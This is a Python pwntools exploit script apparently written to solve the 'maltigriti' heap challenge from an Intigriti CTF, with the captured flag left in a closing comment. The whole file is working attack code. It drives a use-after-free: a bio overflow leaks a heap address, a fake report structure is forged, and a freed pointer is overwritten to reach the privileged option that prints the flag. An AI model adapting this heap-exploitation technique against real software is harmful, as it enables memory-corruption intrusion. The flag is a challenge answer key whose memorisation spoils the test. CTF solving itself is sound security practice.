#!/usr/bin/env python3
from pwn import *
# helper
def byte2hex(byte_str):
    return int('0x' + byte_str[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
elf = ELF('./maltigriti')
lib = ELF('./libc.so.6', checksec=False)

script = """
brva 0x000000000001969
# brva 0x000000000001627
# brva 0x000000000001371
c
"""

if args.REMOTE:
    p = remote('maltigriti.ctf.intigriti.io', 1337)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=script, aslr=False)
else:
    p = process(elf.path)

def reg(name, pw, bio, biolength=None):
    p.sendlineafter(b'> ', b'0')
    p.sendlineafter(b'> ', name)
    p.sendlineafter(b'> ', pw)
    if biolength:
        p.sendlineafter(b'> ', str(biolength).encode())
        p.sendlineafter(b'> ', bio)
    else:
        p.sendlineafter(b'> ', bio)
def edit(bio, biolength=None):
    p.sendlineafter(b'> ', b'1')
    if biolength:
        p.sendlineafter(b'> ', str(biolength).encode())
        p.sendlineafter(b'> ', bio)
    else:
        p.sendlineafter(b'> ', bio)
def logout():
    p.sendlineafter(b'> ', b'6')
def report(title, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', title)
    p.sendlineafter(b'> ', content)
def show():
    p.sendlineafter(b'> ', b'3')
        
# reg(b'aa', b'aa', b'cc', 0x420)
# logout()
reg(b'aa', b'aa', b'bb', 0x10)
logout()
reg(b'aa', b'aa', b'bb', 0x10)
logout()
reg(b'aa', b'aa', b'bb', 0x10)
logout()
reg(b'aa', b'aa', b'bb', 0xc0)
logout()
report(b'cc', b'cc')
report(b'cc', b'cc')
edit(b'a'*183)
show()

p.recvuntil(b'Bounty: ')
p.recvuntil(b'Bounty: ')
heap = int(p.recvline())
log.info("heap " + hex(heap))

# next = heap + (0x55e503ab0510-0x55e503ab03e)
# edit(b'a'*184 + p64(next))

user = heap + (0x560e14cbf750-0x560e14cbf3e0)
fakereport = p64(user) + p64(0x41) + p64(0xffffff)
fakereport = fakereport.ljust(184+8, b'\x00')
reg(b'aa', b'aa', fakereport, 0x100)
reg(b'aa', b'aa', b'bb', 0xc0)
logout()
report(b'cc', b'cc')
next = heap + (0x55e96bf96640-0x55e96bf963e0)
# gdb.attach(p, gdbscript=script)
# sleep(2)
edit(b'a'*184 + p64(next))

p.sendlineafter(b'> ', b'5')
p.recvuntil(b' pack:')
print(p.recvline())


p.interactive()

# INTIGRITI{u53_4f73r_fr33_50und5_600d_70_m3}\